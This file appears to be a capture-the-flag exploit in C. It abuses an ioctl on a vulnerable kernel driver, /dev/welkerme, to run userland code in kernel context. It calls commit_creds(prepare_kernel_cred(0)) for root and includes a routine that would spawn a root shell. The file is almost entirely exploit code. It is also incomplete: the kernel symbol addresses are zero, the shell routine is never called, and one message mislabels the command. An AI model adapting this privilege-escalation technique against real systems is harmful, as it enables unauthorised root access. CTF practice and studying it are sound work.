#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <stdint.h>

#define CMD_ECHO 0xc0de0001
#define CMD_EXEC 0xc0de0002

typedef uint64_t u64;
u64 prepare_kernel_cred = 0;
u64 commit_creds = 0;

void func(void) {
	void *(*pkc)(int) = (void *(*)(int))prepare_kernel_cred;
	void (*cc)(void *) = (void (*)(void*))commit_creds;
	cc(pkc(0));
}
void getShell(){
	if(getuid()!=0){
		printf("[x] getshell failed\n");
	}else{
		printf("[+] now shell\n");
		system("/bin/sh");
	}
}
int main(void) {
  int fd, ret;

  if ((fd = open("/dev/welkerme", O_RDWR)) < 0) {
    perror("/dev/welkerme");
    exit(1);
  }

  ret = ioctl(fd, CMD_EXEC, func);
  printf("CMD_ECHO(12345) --> %d\n", ret);

  close(fd);
  return 0;
}
